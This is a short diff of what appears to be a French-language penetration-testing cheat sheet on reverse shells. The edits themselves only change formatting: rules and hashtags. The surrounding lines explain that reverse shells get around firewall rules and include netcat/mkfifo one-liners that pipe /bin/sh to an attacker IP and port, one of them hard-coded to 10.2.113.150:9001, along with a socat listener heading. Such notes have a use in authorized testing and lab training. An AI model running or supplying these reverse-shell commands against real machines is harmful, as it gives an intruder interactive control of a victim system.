@@ -4,9 +4,10 @@ C'est un bon moyen de contourner les règles de pare-feu qui peuvent vous empêc
 
 **cependant, l'inconvénient est que, lorsque vous recevez un shell d'une machine via Internet, vous devrez configurer votre propre réseau pour accepter le shell.**
 
----
+
 # socat
-#linux #windows
+linux, windows
+
 Ecouteur de shell socat
 
 ```
@@ -77,7 +78,7 @@ mkfifo /tmp/f; nc <ATTACK-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.113.150 9001 >/tmp/f
 ```
 
----
+
 # powershell 
 #windows 
 
